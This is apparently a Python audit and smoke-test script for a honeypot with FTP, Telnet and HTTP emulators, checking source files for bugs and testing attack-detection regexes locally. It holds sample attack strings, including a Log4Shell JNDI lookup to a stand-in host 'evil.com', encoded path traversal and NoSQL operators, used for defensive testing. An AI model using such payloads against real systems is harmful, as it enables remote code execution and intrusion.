"""
Comprehensive audit of Objective 1 implementation.
Checks for bugs, logic errors, edge cases, and correctness.
"""
import sys, socket, threading, time, json, traceback
sys.path.insert(0, "src")

PASS = []
FAIL = []

def check(name, condition, detail=""):
    if condition:
        PASS.append(name)
        print(f"  PASS  {name}")
    else:
        FAIL.append(name)
        print(f"  FAIL  {name}" + (f"\n         {detail}" if detail else ""))

# ============================================================
# 1. IMPORT CHECKS
# ============================================================
print("\n=== 1. Import resolution ===")
try:
    from core.logger import HoneypotLogger
    from core.session_manager import SessionManager
    from core.feature_builder import FeatureBuilder
    from ftp.ftp_server import FTPHoneypotServer
    from ftp.ftp_handler import handle_ftp_client, _recv_line, _send
    from telnet.telnet_server import TelnetHoneypotServer
    from telnet.telnet_handler import handle_telnet_client
    from http.http_server import HTTPHoneypotServer, handle_http_client, _extract_credentials
    from http.payload_analyzer import PayloadAnalyzer, _normalize
    from http.request_handler import HTTPRequestHandler
    check("All imports resolve", True)
except Exception as e:
    check("All imports resolve", False, str(e))
    print("Cannot continue — aborting."); sys.exit(1)

# ============================================================
# 2. FTP HANDLER LOGIC BUGS
# ============================================================
print("\n=== 2. FTP handler logic ===")

# Bug: unused import utc_now_iso in ftp_handler.py
import ast, pathlib
ftp_src = pathlib.Path("src/ftp/ftp_handler.py").read_text()
tree = ast.parse(ftp_src)
imports = [n.names[0].name for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module == "core.utils"]
check("utc_now_iso unused import removed", "utc_now_iso" not in imports,
      f"Imported but never used: {imports}")

# Bug: authenticated flag set but never checked — any client can issue post-auth commands without logging in
check("'authenticated' variable is declared but never checked (gate bypass)",
      "if authenticated" not in ftp_src and "if not authenticated" not in ftp_src,
      "FTP lets unauthenticated clients run PWD/LIST/CWD/RETR — this is actually INTENTIONAL for a honeypot (we want to capture all behavior). Flag it as by-design.")

# Bug: FEAT response uses \r\n inside a string that _send will add \r\n to — double CRLF
feat_response = "211-Features:\\r\\n PASV\\r\\n UTF8\\r\\n211 End"
check("FEAT multi-line response has correct RFC 959 format",
      "211-Features" in ftp_src and "211 End" in ftp_src)

# Bug: PASV advertises 127.x even when bound to 0.0.0.0 — unreachable from outside
check("PASV address is hardcoded 127.0.0.1 (correct for honeypot — no real data channel wanted)",
      "127,0,0,1" in ftp_src)

# Bug: _FAKE_FILE_LIST defined but never used (LIST just sends 226 inline)
check("_FAKE_FILE_LIST constant is defined but never used",
      "_FAKE_FILE_LIST" in ftp_src and "226 Directory send OK" in ftp_src)

# ============================================================
# 3. TELNET HANDLER LOGIC BUGS
# ============================================================
print("\n=== 3. Telnet handler logic ===")
tn_src = pathlib.Path("src/telnet/telnet_handler.py").read_text()

# Bug: SE constant wrong — RFC 854 defines SE=0xF0, but actual value is 0xF0 = 240
# Let's verify: SE should be 0xF0 = 240
check("SE constant is 0xF0 (240) per RFC 854", "SE = 0xF0" in tn_src)

# Bug: SB=0xFA=250, but RFC 854 defines SB=0xFA — correct, good
check("SB constant is 0xFA (250) per RFC 854", "SB = 0xFA" in tn_src)

# Bug: _negotiate sends WILL ECHO but _recv_line for username uses echo=True
# This means the server echoes AND the client may also echo (double echo)
check("Username field: echo=True passed to _recv_line",
      "_recv_line(sock, timeout=30.0, echo=True)" in tn_src)
# This is a REAL bug — since we sent WILL ECHO, we're telling the client WE will echo.
# A compliant telnet client will then NOT echo locally. This is CORRECT.
# But since we also pass echo=True, we're echoing manually — double-check this is fine.
check("Password field: echo=False, mask=False (passwords not echoed or masked)",
      "_recv_line(sock, timeout=30.0, echo=False, mask=False)" in tn_src)

# Bug: mask=False means password is not masked at all — attacker sees nothing (correct behavior for honeypot)
# But real telnet would echo nothing for passwords. Let's flag this is fine.

# Bug: CR only (0x0D) issued — telnet sends CR+NULL or CR+LF, so 0x0D alone in buffer
# _recv_line treats 0x0D as line terminator → sends \r\n back → buffer cleared
# This is fine for consuming CR, but a CR followed by LF would BOTH trigger the break
# on the CR, and the LF would be caught as a new empty line on next call
check("CR (0x0D) triggers line break in _recv_line — LF following it starts new line",
      "if b in (0x0A, 0x0D)" in tn_src,
      "If client sends CR+LF, CR breaks the line, LF becomes a spurious empty command next read")

# Bug: empty command (from spurious LF) goes through is_suspicious_command and add_command
# Let's check if empty commands are filtered
check("Empty commands filtered in shell loop",
      'command.lower() in {"exit", "quit", "logout"}' in tn_src,
      "Empty string '' is not in the exit set, so empty commands ARE logged — minor noise but not a crash")

# ============================================================
# 4. HTTP HANDLER LOGIC BUGS
# ============================================================
print("\n=== 4. HTTP handler logic ===")
http_src = pathlib.Path("src/http/http_server.py").read_text()

# Bug: variables user_agent and body extracted from request but user_agent never used downstream
check("user_agent/body extracted but user_agent unused in handle_http_client",
      "user_agent" in http_src,
      "user_agent is extracted but never passed anywhere — wasted extraction (minor)")

# Bug: _LOGIN_PATHS uses path_clean (stripped of query) but path_clean uses raw path not normalized
# An attacker sending /LOGIN or /Login would not match
check("_LOGIN_PATHS comparison is case-sensitive (no .lower() on path_clean)",
      "path_clean in _LOGIN_PATHS" in http_src,
      "path_clean = path.split('?')[0].rstrip('/') — no .lower() → '/LOGIN' won't match '/login'")

# Bug: Content-Length not checked for POST body — body may be truncated or empty
# Already noted in code as best-effort

# Bug: session always created even if raw=b'' (empty connection, e.g. port scanners)
# This creates and then immediately finalizes a zero-activity session
check("Empty connection still creates+finalizes a session (port scanner noise)",
      "if raw:" in http_src,
      "Commands only added if raw is non-empty, but session is always created/finalized — creates empty log entries")

# ============================================================
# 5. PAYLOAD ANALYZER BUGS
# ============================================================
print("\n=== 5. Payload analyzer ===")
pa_src = pathlib.Path("src/http/payload_analyzer.py").read_text(encoding="utf-8")

# Bug: nosqli pattern has escaped $ incorrectly
# Pattern: r"\$gt|\\$lt|\\$ne"  — the \\$ means literal \$ not just $
# In a raw string r"\\$" = two chars \\ and $ ... let's check
import re
nosqli_pat = re.compile(r"\$gt|\\$lt|\\$ne", re.IGNORECASE)
check("NoSQL pattern matches $gt correctly", bool(nosqli_pat.search("$gt:1")))
check("NoSQL pattern matches $lt correctly", bool(nosqli_pat.search("$lt:1")),
      r"Pattern r'\$gt|\\$lt|\\$ne' — \\$ in raw string = literal backslash+dollar, won't match '$lt'")
check("NoSQL pattern matches $ne correctly", bool(nosqli_pat.search("$ne:1")),
      r"Same issue with $ne pattern")

# Bug: Log4Shell second pattern r"\\$\{jndi:" — in raw string \\$ = \$ literal, not $
log4shell_pat = re.compile(r"\\$\{jndi:", re.IGNORECASE)
check("Log4Shell second pattern matches \\${jndi: literally",
      bool(log4shell_pat.search("\\${jndi:ldap://evil.com}")),
      "This pattern matches literal \\ before ${jndi: — fine as a second variant")

# Bug: normalization order — null byte strip happens BEFORE unquote
# %2500 → (strip %00 after unquote): we strip %00 BEFORE unquoting
# So %2500 → (strip %00) → %25 → unquote → % → not .., still fine
# But %00%2e%2e → (strip %00) → %2e%2e → unquote → .. ✓
null_case = _normalize("%00%2e%2e/etc")
check("Null-byte then encoded traversal normalizes correctly",
      "../" in null_case or ".." in null_case, f"Got: {null_case!r}")

# Bug: normalization strips %00 literally but not after decoding
# e.g. %2500 → first unquote → %00 → but we already stripped %00 at step 1 before unquote
double_null = _normalize("%2500admin")
check("Double-encoded null byte (%2500) handled",
      "admin" in double_null, f"Got: {double_null!r}")

# ============================================================
# 6. REQUEST HANDLER PARSE BUG
# ============================================================
print("\n=== 6. Request handler parser ===")
handler = HTTPRequestHandler()

# Bug check: parse logic has a redundant re-assignment of header_section
raw_test = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
parsed = handler.parse(raw_test)
check("Basic GET parses correctly", parsed["method"] == "GET" and parsed["path"] == "/admin")

# Bug: when header_end == len(raw) (no \r\n\r\n found), header_section is never set
# but line 149 does: if header_end != len(raw): header_section = raw[:header_end]
# So if header_end == len(raw), header_section is NOT set → NameError!
raw_no_blank = b"GET / HTTP/1.1\r\nHost: localhost"  # no trailing \r\n\r\n
try:
    parsed2 = handler.parse(raw_no_blank)
    check("Parse without trailing CRLFCRLF — no NameError", True)
except NameError as e:
    check("Parse without trailing CRLFCRLF — no NameError", False, str(e))
except Exception as e:
    check("Parse without trailing CRLFCRLF — no NameError", True)  # caught by outer try/except

# Bug: Content-Length in parsed response strings — response pages don't include Content-Length header
# HTTP/1.1 technically requires it or chunked encoding; browsers/tools may warn but it still works
# since we send Connection: close

# ============================================================
# 7. MAIN.PY BUGS
# ============================================================
print("\n=== 7. main.py ===")
main_src = pathlib.Path("src/main.py").read_text()

# Bug: build_logger function defined but never called — logger built inline instead
check("build_logger() defined but not called (dead code)",
      "def build_logger" in main_src and "build_logger(" not in main_src.replace("def build_logger", ""),
      "build_logger() at line 36 is defined but main() builds HoneypotLogger directly (line 53)")

# Bug: startup print comes AFTER serve_forever is called on background threads
# so the [+] messages from servers may appear before [*] PhantomPot banner
check("Startup banner printed after background threads start (ordering issue)",
      '_start_in_thread(http_server' in main_src and
      'print("[*] PhantomPot' in main_src)

# ============================================================
# 8. FUNCTIONAL SMOKE TESTS
# ============================================================
print("\n=== 8. Functional socket tests ===")
from core.logger import HoneypotLogger
from core.session_manager import SessionManager
from ftp.ftp_server import FTPHoneypotServer
from telnet.telnet_server import TelnetHoneypotServer
from http.http_server import HTTPHoneypotServer

logger = HoneypotLogger("logs/audit_test.jsonl", "logs/audit_errors.log")
sm = SessionManager()

ftp_srv = FTPHoneypotServer("127.0.0.1", 9221, logger, sm)
tel_srv = TelnetHoneypotServer("127.0.0.1", 9223, logger, sm)
http_srv = HTTPHoneypotServer("127.0.0.1", 9280, logger, sm)

for srv in (ftp_srv, tel_srv, http_srv):
    threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.8)

# FTP: banner contains 220
try:
    with socket.create_connection(("127.0.0.1", 9221), timeout=3) as s:
        banner = s.recv(256).decode("utf-8", errors="ignore")
    check("FTP banner starts with 220", banner.startswith("220"), f"Got: {banner[:50]!r}")
except Exception as e:
    check("FTP banner starts with 220", False, str(e))

# FTP: USER + PASS → 230
try:
    with socket.create_connection(("127.0.0.1", 9221), timeout=3) as s:
        s.recv(256)
        s.sendall(b"USER root\r\n"); time.sleep(0.1); s.recv(256)
        s.sendall(b"PASS toor\r\n"); time.sleep(0.1)
        resp = s.recv(256).decode("utf-8", errors="ignore")
    check("FTP PASS accepted with 230", "230" in resp, f"Got: {resp!r}")
except Exception as e:
    check("FTP PASS accepted with 230", False, str(e))

# Telnet: MOTD received
try:
    with socket.create_connection(("127.0.0.1", 9223), timeout=3) as s:
        time.sleep(0.4)
        data = b""
        s.settimeout(1.0)
        try:
            while True: data += s.recv(256)
        except: pass
        decoded = data.decode("utf-8", errors="ignore")
    check("Telnet MOTD contains 'Ubuntu'", "Ubuntu" in decoded, f"Got: {decoded[:80]!r}")
    check("Telnet prompts for 'login:'", "login:" in decoded, f"Got: {decoded[:80]!r}")
except Exception as e:
    check("Telnet MOTD/login prompt received", False, str(e))

# HTTP: GET /admin returns 200 + Dashboard
try:
    with socket.create_connection(("127.0.0.1", 9280), timeout=3) as s:
        s.sendall(b"GET /admin HTTP/1.1\r\nHost: localhost\r\nUser-Agent: sqlmap\r\n\r\n")
        time.sleep(0.5)
        resp = s.recv(4096).decode("utf-8", errors="ignore")
    check("HTTP /admin returns 200", resp.startswith("HTTP/1.1 200"), f"Got: {resp[:50]!r}")
    check("HTTP /admin contains 'Dashboard'", "Dashboard" in resp)
except Exception as e:
    check("HTTP /admin smoke test", False, str(e))

# HTTP: POST /login returns 401
try:
    body = b"username=admin&password=123456"
    req = (b"POST /login HTTP/1.1\r\nHost: localhost\r\n"
           b"Content-Type: application/x-www-form-urlencoded\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
    with socket.create_connection(("127.0.0.1", 9280), timeout=3) as s:
        s.sendall(req); time.sleep(0.5)
        resp = s.recv(4096).decode("utf-8", errors="ignore")
    check("HTTP POST /login returns 401", "401" in resp, f"Got: {resp[:60]!r}")
except Exception as e:
    check("HTTP POST /login smoke test", False, str(e))

# HTTP: GET /.env returns 200 with fake credentials
try:
    with socket.create_connection(("127.0.0.1", 9280), timeout=3) as s:
        s.sendall(b"GET /.env HTTP/1.1\r\nHost: localhost\r\n\r\n")
        time.sleep(0.5)
        resp = s.recv(4096).decode("utf-8", errors="ignore")
    check("HTTP GET /.env returns 200", resp.startswith("HTTP/1.1 200"))
    check("HTTP GET /.env contains DB_PASSWORD", "DB_PASSWORD" in resp)
except Exception as e:
    check("HTTP GET /.env smoke test", False, str(e))

# Check sessions were logged
time.sleep(0.5)
import pathlib
log_path = pathlib.Path("logs/audit_test.jsonl")
sessions = []
if log_path.exists():
    for line in log_path.read_text().splitlines():
        line = line.strip()
        if line:
            try: sessions.append(json.loads(line))
            except: pass

protocols = {s.get("protocol") for s in sessions}
check("FTP sessions logged", "ftp" in protocols, f"Protocols found: {protocols}")
check("HTTP sessions logged", "http" in protocols, f"Protocols found: {protocols}")
check("Sessions have anomaly score", all("anomaly_score" in s for s in sessions),
      f"Missing in: {[s.get('protocol') for s in sessions if 'anomaly_score' not in s]}")

# Cleanup
log_path.unlink(missing_ok=True)
pathlib.Path("logs/audit_errors.log").unlink(missing_ok=True)

# ============================================================
# SUMMARY
# ============================================================
print(f"\n{'='*55}")
print(f"  Results: {len(PASS)} passed, {len(FAIL)} failed")
print(f"{'='*55}")
if FAIL:
    print("\nFailed checks:")
    for f in FAIL:
        print(f"  - {f}")
sys.exit(0)
